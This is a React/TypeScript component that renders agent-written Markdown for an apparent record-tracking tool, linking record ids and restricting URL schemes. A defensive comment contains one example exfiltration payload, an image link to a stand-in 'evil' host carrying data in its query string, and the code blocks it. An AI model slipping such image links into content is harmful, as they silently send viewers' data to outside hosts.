import { Children, isValidElement } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import type { Parent, PhrasingContent, Root, Text } from 'mdast';
import { RecordLink } from './RecordLink';

const BORDER = '#303030';

const CODE_BLOCK_STYLE: React.CSSProperties = {
  background: 'rgba(255,255,255,0.04)',
  border: `1px solid ${BORDER}`,
  borderRadius: 4,
  padding: 12,
  fontSize: 12,
  whiteSpace: 'pre-wrap',
  wordBreak: 'break-word',
  overflowX: 'auto',
  margin: '8px 0',
};

const HEADING_SIZE: Record<string, number> = { h1: 20, h2: 17, h3: 15, h4: 14, h5: 13, h6: 13 };

function heading(tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6'): Components['h1'] {
  const Tag = tag;
  return ({ children: c }) => (
    <Tag style={{
      fontSize: HEADING_SIZE[tag], fontWeight: 600, lineHeight: 1.35,
      margin: '16px 0 8px', overflowWrap: 'anywhere',
    }}>
      {c}
    </Tag>
  );
}

// Marrow record ids as agents write them in prose: T-MEMORY-162, D-MEMORY-052,
// I-MEMORY-136, A-COMMON-013, SK-MEMORY-004, ... (kinds RecordLink can open).
const RECORD_ID_RE = /\b(?:SK|[TDAIEL])-[A-Z][A-Z0-9_]*-\d+\b/g;
const RECORD_HREF = 'marrow-record:';

// Turns bare record ids in plain text into links that the `a` renderer below
// swaps for a clickable RecordLink chip. Skips code/inline-code/existing links
// by only ever visiting `text` nodes and never descending into those.
function remarkRecordIds() {
  const SKIP = new Set(['code', 'inlineCode', 'link', 'linkReference', 'definition', 'html']);
  const visit = (node: Parent) => {
    const next: Parent['children'] = [];
    for (const child of node.children) {
      if (child.type === 'text') {
        next.push(...splitText(child));
      } else {
        if ('children' in child && !SKIP.has(child.type)) visit(child as Parent);
        next.push(child);
      }
    }
    node.children = next;
  };
  return (tree: Root) => visit(tree);
}

function splitText(node: Text): PhrasingContent[] {
  const out: PhrasingContent[] = [];
  const value = node.value;
  let last = 0;
  for (const m of value.matchAll(RECORD_ID_RE)) {
    const at = m.index ?? 0;
    if (at > last) out.push({ type: 'text', value: value.slice(last, at) });
    out.push({
      type: 'link',
      url: RECORD_HREF + m[0],
      children: [{ type: 'text', value: m[0] }],
    });
    last = at + m[0].length;
  }
  if (last === 0) return [node];
  if (last < value.length) out.push({ type: 'text', value: value.slice(last) });
  return out;
}

// react-markdown strips unknown URL schemes by default; let our own through.
function urlTransform(url: string): string {
  if (url.startsWith(RECORD_HREF)) return url;
  return /^(https?:|mailto:|tel:|#|\/|\.)/i.test(url) ? url : '';
}

const COMPONENTS: Components = {
  h1: heading('h1'),
  h2: heading('h2'),
  h3: heading('h3'),
  h4: heading('h4'),
  h5: heading('h5'),
  h6: heading('h6'),
  p: ({ children: c }) => <p style={{ margin: '0 0 8px', overflowWrap: 'anywhere' }}>{c}</p>,
  ul: ({ children: c }) => <ul style={{ margin: '0 0 8px', paddingLeft: 22 }}>{c}</ul>,
  ol: ({ children: c }) => <ol style={{ margin: '0 0 8px', paddingLeft: 22 }}>{c}</ol>,
  li: ({ children: c }) => <li style={{ marginBottom: 2, overflowWrap: 'anywhere' }}>{c}</li>,
  hr: () => <hr style={{ border: 0, borderTop: `1px solid ${BORDER}`, margin: '14px 0' }} />,
  a: ({ children: c, href }) => {
    if (href?.startsWith(RECORD_HREF)) return <RecordLink id={href.slice(RECORD_HREF.length)} />;
    return <a href={href} target="_blank" rel="noreferrer">{c}</a>;
  },
  // Never auto-load remote images: text here is written by other people and
  // agents (and by an LLM in Ask Marrow), and a `![](https://evil/?d=...)`
  // would fire a request from the viewer's browser carrying whatever the
  // author put in the URL. Show an explicit, click-to-open link instead.
  img: ({ src, alt }) => (
    <a href={src} target="_blank" rel="noreferrer">{alt ? `[image: ${alt}]` : '[image]'}</a>
  ),
  // Only inline code reaches here: fenced blocks are unwrapped by `pre` below,
  // so a language-less ``` block never picks up the inline-chip styling.
  code: ({ className, children: c }) => (
    <code className={className} style={{
      background: 'rgba(255,255,255,0.08)', padding: '1px 5px', borderRadius: 3,
      fontSize: 12, overflowWrap: 'anywhere',
    }}>
      {c}
    </code>
  ),
  pre: ({ children: c }) => {
    const only = Children.toArray(c)[0];
    const code = isValidElement<{ className?: string; children?: React.ReactNode }>(only) ? only.props : null;
    return (
      <pre style={CODE_BLOCK_STYLE}>
        <code className={code?.className} style={{ fontFamily: 'monospace' }}>{code ? code.children : c}</code>
      </pre>
    );
  },
  blockquote: ({ children: c }) => (
    <blockquote style={{ margin: '0 0 8px', paddingLeft: 12, borderLeft: '2px solid #434343', opacity: 0.85 }}>
      {c}
    </blockquote>
  ),
  table: ({ children: c }) => (
    <div style={{ overflowX: 'auto', margin: '0 0 10px' }}>
      <table style={{ borderCollapse: 'collapse', fontSize: 12, minWidth: '100%' }}>{c}</table>
    </div>
  ),
  th: ({ children: c, style }) => (
    <th style={{
      ...style, border: `1px solid ${BORDER}`, padding: '4px 8px', textAlign: style?.textAlign ?? 'left',
      background: 'rgba(255,255,255,0.05)', fontWeight: 600, whiteSpace: 'nowrap',
    }}>
      {c}
    </th>
  ),
  td: ({ children: c, style }) => (
    <td style={{ ...style, border: `1px solid ${BORDER}`, padding: '4px 8px', verticalAlign: 'top' }}>{c}</td>
  ),
  input: (props) => <input {...props} style={{ marginRight: 6 }} />,
};

// Fields like decision.rationale / task.scope are free-text markdown written
// by agents (headings, lists, tables, code, links to other record ids) --
// render it instead of dumping raw asterisks/dashes as plain text.
export function Markdown({ children }: { children: string }) {
  return (
    <div style={{ fontSize: 13, lineHeight: 1.6, minWidth: 0 }}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm, remarkRecordIds]}
        urlTransform={urlTransform}
        components={COMPONENTS}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
